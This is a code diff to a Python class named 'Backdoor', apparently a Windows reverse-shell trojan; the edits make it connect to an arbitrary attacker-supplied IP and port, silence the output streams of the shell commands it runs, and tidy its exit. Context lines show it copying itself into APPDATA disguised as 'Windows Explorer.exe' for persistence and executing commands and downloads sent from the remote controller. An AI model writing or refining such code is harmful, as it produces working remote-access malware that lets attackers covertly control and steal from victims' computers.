@@ -13,7 +13,7 @@ class Backdoor:
 	def __init__(self,ip,port):
 		self.become_persistent()
 		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-		self.connection.connect(("localhost",1234))
+		self.connection.connect((ip,port))
 		
 	def become_persistent(self):
 		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
@@ -35,7 +35,9 @@ class Backdoor:
 				continue
 
 	def execute_system_commmand(self,command):
-		return subprocess.check_output(command,shell=True)
+		DEVNULL = open(os.devnull, 'wb')         #For python 2
+		#return subprocess.check_output(command,shell=True, stderr = subprocess.DEVNULL, stdin = subprocess.DEVNULL)    # For Python 3
+		return subprocess.check_output(command,shell=True, stderr = DEVNULL, stdin = DEVNULL)     #For Python 2
 
 	def change_working_directory_to(self,path):
 		os.chdir(path)
@@ -56,7 +58,7 @@ class Backdoor:
 			try:
 				if command[0] == "exit":
 					self.connection.close()
-					exit()
+					sys.exit()
 				elif command[0] == "cd" and len(command) > 1:
 					command_result = self.change_working_directory_to(command[1])
 				elif command[0] == "download":
